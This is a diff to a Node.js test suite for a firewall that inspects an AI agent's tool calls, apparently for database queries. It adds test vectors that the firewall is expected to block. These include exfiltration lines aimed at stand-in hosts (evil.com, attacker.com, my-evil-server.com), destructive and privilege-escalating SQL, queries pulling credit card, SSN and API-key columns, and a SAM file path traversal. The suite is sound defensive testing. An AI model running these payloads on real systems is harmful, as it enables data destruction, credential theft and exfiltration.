@@ -1,7 +1,7 @@
 /**
  * Comprehensive Penetration Testing & Cryptographic Verification Suite
  * 
- * Verifies 100% block rate across all penetration attack payloads from the security audit reports.
+ * Verifies 100% block rate across all 25 critical and high security audit findings.
  */
 
 const test = require('node:test');
@@ -77,7 +77,7 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
       id: 11,
       category: 'Unauthorized FTP Exfiltration',
       payload: 'ftp://evil.com/upload -d data.txt',
-      expectedRule: 'DATA_EXFILTRATION_URL'
+      expectedRule: 'DANGEROUS_EGRESS_PROTOCOL'
     },
     {
       id: 12,
@@ -95,7 +95,7 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
       id: 14,
       category: 'WebSocket Channel Exfiltration',
       payload: 'new WebSocket("wss://attacker.com/ws")',
-      expectedRule: 'DATA_EXFILTRATION_URL'
+      expectedRule: 'DANGEROUS_EGRESS_PROTOCOL'
     },
     {
       id: 15,
@@ -216,6 +216,72 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
       category: 'Path Traversal on Windows System32',
       payload: 'C:\\Windows\\System32\\config\\SAM',
       expectedRule: 'PATH_TRAVERSAL_DETECTED'
+    },
+    {
+      id: 35,
+      category: 'SQL Comment DDL Hiding Attack',
+      payload: 'SELECT * FROM users; -- DROP TABLE accounts; --',
+      expectedRule: 'DESTRUCTIVE_SQL_DDL'
+    },
+    {
+      id: 36,
+      category: 'SQL Delete with WHERE 1=1 Tautology',
+      payload: 'DELETE FROM users WHERE 1=1;',
+      expectedRule: 'UNCONSTRAINED_DELETE'
+    },
+    {
+      id: 37,
+      category: 'SQL Privilege Escalation with Numeric is_admin=1',
+      payload: "UPDATE users SET is_admin=1 WHERE username='admin';",
+      expectedRule: 'SQL_PRIVILEGE_ESCALATION'
+    },
+    {
+      id: 38,
+      category: 'DLP Sensitive Column Extraction (credit_card, ssn)',
+      payload: 'SELECT credit_card,ssn,bank_account_number FROM user_data;',
+      expectedRule: 'DLP_SENSITIVE_COLUMN_EXTRACTION_BLOCKED'
+    },
+    {
+      id: 39,
+      category: 'DLP Sensitive Column Extraction (api_key, secret_token)',
+      payload: 'SELECT api_key, secret_token FROM app_config;',
+      expectedRule: 'DLP_SENSITIVE_COLUMN_EXTRACTION_BLOCKED'
+    },
+    {
+      id: 40,
+      category: 'Sensitive Table Query (password_table)',
+      payload: 'SELECT * FROM password_table;',
+      expectedRule: 'SENSITIVE_CREDENTIAL_TABLE_BLOCKED'
+    },
+    {
+      id: 41,
+      category: 'Sensitive Table Query (secrets)',
+      payload: 'SELECT * FROM secrets;',
+      expectedRule: 'SENSITIVE_CREDENTIAL_TABLE_BLOCKED'
+    },
+    {
+      id: 42,
+      category: 'Schema Enumeration (information_schema.tables)',
+      payload: 'SELECT * FROM information_schema.tables;',
+      expectedRule: 'SENSITIVE_CREDENTIAL_TABLE_BLOCKED'
+    },
+    {
+      id: 43,
+      category: 'Subquery-based Sensitive Exfiltration',
+      payload: 'SELECT * FROM users WHERE id=(SELECT password FROM admin_users);',
+      expectedRule: 'DLP_SENSITIVE_COLUMN_EXTRACTION_BLOCKED'
+    },
+    {
+      id: 44,
+      category: 'Multi-Statement Semicolon with Comment Boundary',
+      payload: 'SELECT * FROM users;--',
+      expectedRule: 'SQL_MULTI_STATEMENT_INJECTION'
+    },
+    {
+      id: 45,
+      category: 'Strict Egress Firewall Violation (Arbitrary Domain)',
+      payload: 'POST https://my-evil-server.com/exfil',
+      expectedRule: 'EGRESS_FIREWALL_VIOLATION'
     }
   ];
 
@@ -229,7 +295,7 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
     });
   }
 
-  await t.test('Vector #35 [In-Place Unicode & Zero-Width Sanitization]: Injected U+200B and U+202E characters MUST be stripped from returned payload', () => {
+  await t.test('Vector #46 [In-Place Unicode & Zero-Width Sanitization]: Injected U+200B and U+202E characters MUST be stripped from returned payload', () => {
     const dirtyPayload = { query: 'SELECT id,\u200B name\u202E FROM users WHERE active = true' };
     const res = waf.inspectToolCall('postgres_query', dirtyPayload);
 
@@ -239,7 +305,7 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
     assert.ok(!res.sanitizedPayload.query.includes('\u202E'), 'Failed to strip U+202E RTL override character!');
   });
 
-  await t.test('Vector #36 [Legitimate Safe Query]: Should permit and cryptographically sign valid read queries', () => {
+  await t.test('Vector #47 [Legitimate Safe Query]: Should permit and cryptographically sign valid read queries', () => {
     const safePayload = { query: 'SELECT id, name, created_at FROM organizations WHERE plan = "enterprise" LIMIT 20;' };
     const res = waf.inspectToolCall('postgres_query', safePayload);
 
@@ -250,7 +316,7 @@ test('Comprehensive Penetration Testing & Cryptographic Audit Verification Suite
     assert.ok(res.publicKey);
   });
 
-  await t.test('Vector #37 [Ed25519 Canonical Specification & Mathematical Verification]: Anyone can independently verify the signature against the published canonical format', () => {
+  await t.test('Vector #48 [Ed25519 Canonical Specification & Mathematical Verification]: Anyone can independently verify the signature against the published canonical format', () => {
     const payload = { query: 'SELECT * FROM users WHERE active = true' };
     const res = waf.inspectToolCall('postgres_query', payload);
 
